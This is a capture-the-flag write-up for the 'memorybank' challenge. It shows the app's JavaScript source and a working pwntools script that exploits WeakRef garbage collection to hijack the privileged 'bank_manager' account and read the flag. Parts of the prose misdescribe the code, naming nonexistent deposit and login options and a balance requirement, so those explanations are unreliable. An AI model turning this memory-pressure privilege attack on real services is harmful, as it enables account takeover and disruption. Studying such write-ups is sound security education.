# memorybank

## Source Code Analysis

```javascript
// ANSI color codes
const RESET = "\x1b[0m";
const GREEN = "\x1b[32m";
const YELLOW = "\x1b[33m";
const BLUE = "\x1b[34m";
const MAGENTA = "\x1b[35m";
const CYAN = "\x1b[36m";
const WHITE = "\x1b[37m";
const BRIGHT = "\x1b[1m";
const DIM = "\x1b[2m";

// ASCII Art
const ATM_ART = `
${CYAN}╔══════════════════════════════════════════════════════╗
║ ${BRIGHT}╔═╗╔╦╗╔╦╗  ╔╦╗╔═╗╔═╗╦ ╦╦╔╗╔╔═╗  ╔╦╗╔═╗╔═╗╦ ╦╦╔╗╔╔═╗${RESET}${CYAN}  ║
║ ${BRIGHT}╠═╣ ║ ║║║──║║║╠═╣║  ╠═╣║║║║║╣ ──║║║╠═╣║  ╠═╣║║║║║╣ ${RESET}${CYAN}  ║
║ ${BRIGHT}╩ ╩ ╩ ╩ ╩  ╩ ╩╩ ╩╚═╝╩ ╩╩╝╚╝╚═╝  ╩ ╩╩ ╩╚═╝╩ ╩╩╝╚╝╚═╝${RESET}${CYAN}  ║
║                                                      ║
║  ${MAGENTA}┌─────────────────────┐${CYAN}                             ║
║  ${MAGENTA}│     ${WHITE}MEMORY BANK${MAGENTA}     │${CYAN}                             ║
║  ${MAGENTA}└─────────────────────┘${CYAN}                             ║
║                                                      ║
║  ${YELLOW}┌─────┬─────┬─────┐${CYAN}                                 ║
║  ${YELLOW}│  ${WHITE}1${YELLOW}  │  ${WHITE}2${YELLOW}  │  ${WHITE}3${YELLOW}  │${CYAN}                                 ║
║  ${YELLOW}├─────┼─────┼─────┤${CYAN}                                 ║
║  ${YELLOW}│  ${WHITE}4${YELLOW}  │  ${WHITE}5${YELLOW}  │  ${WHITE}6${YELLOW}  │${CYAN}                                 ║
║  ${YELLOW}├─────┼─────┼─────┤${CYAN}                                 ║
║  ${YELLOW}│  ${WHITE}7${YELLOW}  │  ${WHITE}8${YELLOW}  │  ${WHITE}9${YELLOW}  │${CYAN}                                 ║
║  ${YELLOW}├─────┼─────┼─────┤${CYAN}                                 ║
║  ${YELLOW}│  ${WHITE}*${YELLOW}  │  ${WHITE}0${YELLOW}  │  ${WHITE}#${YELLOW}  │${CYAN}                                 ║
║  ${YELLOW}└─────┴─────┴─────┘${CYAN}                                 ║
║                                                      ║
║  ${GREEN}╔══════════════════╗${CYAN}                                ║
║  ${GREEN}║ ${WHITE}INSERT CARD HERE${GREEN} ║${CYAN}                                ║
║  ${GREEN}╚══════════════════╝${CYAN}                                ║
║                                                      ║
║  ${BLUE}┌─────────────────┐${CYAN}                                 ║
║  ${BLUE}│ ${WHITE}CASH DISPENSER${BLUE}  │${CYAN}                                 ║
║  ${BLUE}└─────────────────┘${CYAN}                                 ║
╚══════════════════════════════════════════════════════╝${RESET}`;

const MARBLE_TOP = `
${DIM}${WHITE}╔══════════════════════════════════════════════════════╗
║ ▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓   ║
║ ░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░   ║
║ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║
╚══════════════════════════════════════════════════════╝${RESET}`;

const MARBLE_BOTTOM = `
${DIM}${WHITE}╔══════════════════════════════════════════════════════╗
║ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║
║ ░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░   ║
║ ▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓░░▓▓   ║
╚══════════════════════════════════════════════════════╝${RESET}`;

class User {
  constructor(username) {
    this.username = username;
    this.balance = 101;
    this.signature = null;
  }
}

class Bill {
  constructor(value, signature) {
    this.value = value;
    this.serialNumber = 'SN-' + crypto.randomUUID();
    this.signature = new Uint8Array(signature.length);
    for (let i = 0; i < signature.length; i++) {
      this.signature[i] = signature.charCodeAt(i);
    }
  }
  
  toString() {
    return `${this.value} token bill (S/N: ${this.serialNumber})`;
  }
}

class UserRegistry {
  constructor() {
    this.users = [];
  }
  addUser(user) {
    this.users.push(new WeakRef(user));
  }
  getUserByUsername(username) {
    for (let user of this.users) {
      user = user.deref();
      if (!user) continue;
      if (user.username === username) {
        return user;
      }
    }
    return null;
  }
  
  *[Symbol.iterator]() {
    for (const weakRef of this.users) {
      const user = weakRef.deref();
      if (user) yield user;
    }
  }
}
const users = new UserRegistry();

function promptSync(message) {
  const buf = new Uint8Array(1024*1024);
  Deno.stdout.writeSync(new TextEncoder().encode(`${YELLOW}${message}${RESET}`));
  const n = Deno.stdin.readSync(buf);
  return new TextDecoder().decode(buf.subarray(0, n)).trim();
}

function init() {
  users.addUser(new User("bank_manager"));
}

async function main() {
  init();
  console.log(ATM_ART);
  console.log(MARBLE_TOP);
  console.log(`${BRIGHT}${CYAN}Welcome to the Memory Banking System! Loading...${RESET}`);
  console.log(MARBLE_BOTTOM);

  setTimeout(async () => {
    await user();
  }, 1000);
}

async function user() {
  
  let isLoggedIn = false;
  let currentUser = null;
  
  while (true) {
    // If not logged in, require registration
    if (!isLoggedIn) {
      console.log(`${YELLOW}You have 20 seconds to complete your transaction before the bank closes for the day.\n${RESET}`);
      
      // Register user
      while (!isLoggedIn) {
        let username = promptSync("Please register with a username (or type 'exit' to quit): ");
        if (!username) {
          console.log(`${CYAN}Thank you for using Memory Banking System!${RESET}`);
          Deno.exit(0);
        }
        
        if (username.toLowerCase() === 'exit') {
          console.log(`${CYAN}Thank you for using Memory Banking System!${RESET}`);
          Deno.exit(0);
        }

        if (username.toLowerCase() === 'random') {
          username = 'random-' + crypto.randomUUID();
        } else {
          let existingUser = users.getUserByUsername(username);
      
          if (existingUser) {
            console.log(`${MAGENTA}User already exists. Please choose another username.${RESET}`);
            continue;
          }
        }

        currentUser = new User(username);
        users.addUser(currentUser);
        if (currentUser.username === "bank_manager") {
          currentUser.balance = 100000000;
        }
        console.log(MARBLE_TOP);
        console.log(`${BRIGHT}${GREEN}Welcome, ${username}! Your starting balance is ${currentUser.balance} tokens.${RESET}`);
        console.log(MARBLE_BOTTOM);
        
        isLoggedIn = true;
      }
    }
  
    // Banking operations
    console.log("\n" + MARBLE_TOP);
    console.log(`${CYAN}${BRIGHT}Available operations:${RESET}`);
    console.log(`${CYAN}1. Check balance${RESET}`);
    console.log(`${CYAN}2. Withdraw tokens${RESET}`);
    console.log(`${CYAN}3. Set signature${RESET}`);
    console.log(`${CYAN}4. Logout${RESET}`);
    console.log(`${CYAN}5. Exit${RESET}`);
    
    // Special admin option for bank_manager
    if (currentUser.username === "bank_manager") {
      console.log(`${MAGENTA}${BRIGHT}6. Vault: Withdrawflag${RESET}`);
    }
    console.log(MARBLE_BOTTOM);
    
    const choice = promptSync("Choose an operation (1-" + (currentUser.username === "bank_manager" ? "6" : "5") + "): ");
    
    switch (choice) {
      case "1":
        console.log(`${GREEN}Your balance is ${BRIGHT}${currentUser.balance}${RESET}${GREEN} tokens.${RESET}`);
        break;
        
      case "2":
        const amount = parseInt(promptSync("Enter amount to withdraw: "));
        
        if (isNaN(amount) || amount <= 0) {
          console.log(`${MAGENTA}Invalid amount.${RESET}`);
          continue;
        }
        
        if (amount > currentUser.balance) {
          console.log(`${MAGENTA}Insufficient funds.${RESET}`);
          continue;
        }
        
        const billOptions = [1, 5, 10, 20, 50, 100];
        console.log(`${YELLOW}Available bill denominations: ${billOptions.join(", ")}${RESET}`);
        const denomStr = promptSync("Enter bill denomination: ");
        const denomination = parseFloat(denomStr);

        if (denomination <=0 || isNaN(denomination) || denomination > amount) {
          console.log(`${MAGENTA}Invalid denomination: ${denomination}${RESET}`);
          continue;
        }

        const numBills = amount / denomination;
        const bills = [];

        for (let i = 0; i < numBills; i++) {
          bills.push(new Bill(denomination, currentUser.signature || 'VOID'));
        }
        
        currentUser.balance -= amount;
        
        console.log(`${GREEN}Withdrew ${BRIGHT}${amount}${RESET}${GREEN} tokens as ${bills.length} bills of ${denomination}:${RESET}`);
        //bills.forEach(bill => console.log(`- ${bill}`));
        console.log(`${GREEN}Remaining balance: ${BRIGHT}${currentUser.balance}${RESET}${GREEN} tokens${RESET}`);
        break;
        
      case "3":
        // Set signature
        const signature = promptSync("Enter your signature (will be used on bills): ");
        currentUser.signature = signature;
        console.log(`${GREEN}Your signature has been updated${RESET}`);
        break;
        
      case "4":
        // Logout
        console.log(`${YELLOW}You have been logged out.${RESET}`);
        isLoggedIn = false;
        currentUser = null;
        break;
        
      case "5":
        // Exit
        console.log(MARBLE_TOP);
        console.log(`${CYAN}${BRIGHT}Thank you for using Memory Banking System!${RESET}`);
        console.log(MARBLE_BOTTOM);
        Deno.exit(0);
        
      case "6":
        if (currentUser.username === "bank_manager") {
          try {
            const flag = Deno.readTextFileSync("/flag");
            console.log(`${BRIGHT}${GREEN}Flag contents:${RESET}`);
            console.log(`${BRIGHT}${GREEN}${flag}${RESET}`);
          } catch (err) {
            console.log(`${MAGENTA}Error reading flag file:${RESET}`, err.message);
          }
        } else {
          console.log(`${MAGENTA}${BRIGHT}Unauthorized access attempt logged 🚨🚨🚨🚨🚨🚨${RESET}`);
        }
        break;
                    
      default:
        console.log(`${MAGENTA}Invalid option.${RESET}`);
    }
  }
}

main().catch(err => {
  console.error(`${MAGENTA}An error occurred:${RESET}`, err);
  Deno.exit(1);
});
```

The challenge consists of a CLI bank application.  
It enables users to register with a username, log in, and manage a basic virtual bank account. 
The available actions include depositing and withdrawing funds, checking the balance, and logging out.
Internally, the application uses a `UserRegistry` to manage user objects and relies heavily on JavaScript's garbage collection behavior.

Upon user registration, the program stores a `WeakRef` to the user object. 
This means that unless the user is actively referenced elsewhere (e.g., as the `currentUser`), the object is eligible for garbage collection. 
This design introduces an exploitable flaw.

The menu-based interface offers the following actions:

1. Register
2. Login
3. Logout
4. Deposit
5. Withdraw
6. Vault: Withdrawflag (hidden from regular users)

Only a user named `bank_manager` with a balance of at least `100000000` can access the vault.
However, if the original `bank_manager` is garbage collected and a new user registers with the same name, they are treated as a new `bank_manager` and receive the privileged status and high balance, thus granting access to the vault and the flag.

The challenge's difficulty lies not in bypassing authentication per se, but in understanding how weak references and garbage collection can lead to privilege reuse or escalation.

## Exploit

The core of the `memorybank` challenge lies in exploiting the application's flawed user management system, which relies on `WeakRef` objects to track registered users. When no strong references to a user object exist, the object becomes eligible for garbage collection—even for privileged usernames like `bank_manager`.

The objective is to force the original `bank_manager` object to be collected by the garbage collector, then re-register a new user under the same name. Due to poor reference management, the application assigns the new `bank_manager` the original's elevated privileges, including access to the hidden vault and a preloaded balance.

This is accomplished by flooding the system with a large number of random user registrations during an active session. Each new registration increases memory usage, eventually pushing the original `bank_manager` out of memory. Once collected, the application no longer associates the username with the original object, allowing it to be reused.

This technique is particularly effective in environments where:

- Memory is limited or object pools are constrained.
- Session cleanup or garbage collection occurs frequently.
- User tracking relies on weak references without proper ownership checks.

The exploit proceeds as follows:

1. Fill memory with numerous random users to apply pressure on the garbage collector.
2. Wait for the original `bank_manager` object to be collected.
3. Re-register a user with the same username: `bank_manager`.
4. Trigger application logic that assigns the new user privileged status and vault access.
5. Use the privileged account to access the vault and retrieve the flag.

By exploiting the combination of weak references and poor privilege handling, the application can be tricked into granting high-level access to an attacker-controlled user.

### Exploit Script (Python)

The exploit leverages the `pwntools` library to automate interactions with the remote CLI banking service. Here's the full annotated script:

```python
from pwn import remote
import re
import time

# Utility to clean output from the terminal (removes ANSI codes and special characters)
def clean_terminal_output(raw_text):
    if isinstance(raw_text, bytes):
        raw_text = raw_text.decode(errors='replace')
    no_ansi = re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', raw_text)
    no_box = re.sub(r'[\u2500-\u257F\u2580-\u259F\u25A0-\u25FF]', '', no_ansi)
    only_ascii = re.sub(r'[^\x20-\x7E\n]', '', no_box)
    lines = only_ascii.splitlines()
    clean_lines = [line.strip() for line in lines if re.search(r'[A-Za-z0-9]', line)]
    return '\n'.join(clean_lines)

# Key parameters
flag_user = b"bank_manager"
alive_time = 20
rand_user = b"random"
ticket = b"ticket{CalvinCute4220n25:ovRjsAOxoDzzOC6Uvns45006cROCYV9dKf9Xpd_UKin7hs8U}"

# Main loop: wait for garbage collection
while True:
    r = remote("memorybank-tlc4zml47uyjm.shellweplayaga.me", 9005)
    ticket_req = r.recv().decode()
    print(ticket_req)
    r.sendline(ticket)

    # Spam temporary users to fill memory and reduce reference lifespan of bank_manager
    start = time.time()
    while time.time() - start < alive_time - 1:
        r.recvuntil(b"quit):")
        r.sendline(rand_user)         # Register random user
        r.recvuntil(b"(1-5):")
        r.sendline(b"4")              # Deposit (or any interaction to keep loop active)

    r.recvuntil(b"quit):")
    r.sendline(flag_user)            # Try registering as bank_manager again

    try:
        resp = r.recvuntil(b"(1-6):")
        if b"Welcome, bank_manager" in resp:
            print("Flag user found")  # Successfully re-registered as privileged user
            break
    except Exception as e:
        r.close()
        continue
    r.close()

# If successful, option 6 (Vault) is now available
print(clean_terminal_output(resp))
r.sendline(b"6")  # Trigger vault
resp = r.recvall()
print(clean_terminal_output(resp))
```

This abuse of `WeakRef` in a JS-based backend highlights how memory management and user identity can dangerously intersect when not handled properly.